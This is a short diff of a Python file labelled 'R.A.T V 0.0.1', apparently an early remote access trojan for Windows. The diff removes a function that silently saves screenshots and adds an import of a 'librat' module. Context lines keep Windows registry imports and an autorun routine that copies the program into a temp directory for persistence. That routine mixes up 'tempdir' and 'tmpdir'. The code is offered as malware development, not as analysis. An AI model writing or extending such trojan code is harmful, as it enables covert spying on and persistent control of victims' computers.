@@ -3,31 +3,11 @@
 # R.A.T V 0.0.1
 #
 
-from twisted import mail
-import ImageGrab
 import os
 import time
 import sys, base64, os, socket, subprocess
 from _winreg import *
-
-
-def screenGrab():
-    box = ()
-    im = ImageGrab.grab()
-    im.save(os.getcwd() + '\\full_snap__' + str(int(time.time())) +
-'.png', 'PNG')
-
-def search_for_files():
-	"""
-	search for files in the current dirctory.
-	"""
-	pass
-
-def collect_files():
-	"""
-	parse and save all files returned by search_for_files.
-	"""
-	pass
+import librat
 
 def autorun(tempdir, fileName, run):
 	os.system('copy %s %s'%(fileName,tmpdir))
